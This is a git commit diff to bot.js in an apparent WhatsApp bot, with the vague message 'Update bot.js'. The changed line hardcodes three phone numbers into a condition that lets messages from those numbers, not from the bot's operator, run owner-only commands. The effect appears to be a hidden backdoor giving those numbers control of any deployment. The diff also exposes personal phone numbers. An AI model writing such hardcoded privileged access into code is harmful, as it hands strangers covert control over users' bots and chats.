992e258578651662bbc946a3615ecba9a7193933
ᴹᴿ᳆ʀͥᴇᷧᴀͫʟ KING DARK ALPHA <100578082+darkalpha2003@users.noreply.github.com>
2022-03-20 20:28:48 +0530

    Update bot.js

--- bot.js
+++ bot.js
@@ -650,7 +650,7 @@ await conn.sendMessage(msg.key.remoteJid, Buffer.from(lasiyasimg.data), MessageT
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-                    if ((OWN.ff == "94702102324,0" && msg.key.fromMe === false && command.fromMe === true &&
+                    if ((OWN.ff == "94702102324,94711421243,94764679736" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
